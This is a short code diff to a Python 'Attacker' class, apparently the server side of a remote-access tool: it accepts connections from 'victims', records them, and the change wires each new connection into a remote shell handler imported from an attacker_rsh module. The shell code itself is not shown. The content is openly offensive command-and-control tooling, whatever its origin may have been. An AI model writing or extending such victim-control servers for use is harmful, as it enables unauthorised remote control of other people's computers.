@@ -4,6 +4,7 @@ import threading
 import tkinter as tk
 
 from src.modlues.protocols.victim_dataclass import VictimData
+from src.modlues.remote_shell.attacker_rsh import RemoteShellAttackerSide
 
 
 class Attacker:
@@ -28,7 +29,7 @@ class Attacker:
                 conn, addr = self.server.accept()
                 print(f'connection from: {addr}')
 
-                thread = threading.Thread(target=self.__on_new_client, args=(conn, addr)).start()
+                threading.Thread(target=self.__on_new_client, args=(conn, addr)).start()
 
         except Exception as e:
             print(e)
@@ -36,8 +37,7 @@ class Attacker:
 
     def __on_new_client(self, conn, addr):
         self.connected_clients.append(VictimData(conn, addr))
-        for victim in self.connected_clients:
-            print(victim.victim_id, victim.addr)
+        RemoteShellAttackerSide(conn).main()
 
     def __admin_input(self):
         pass
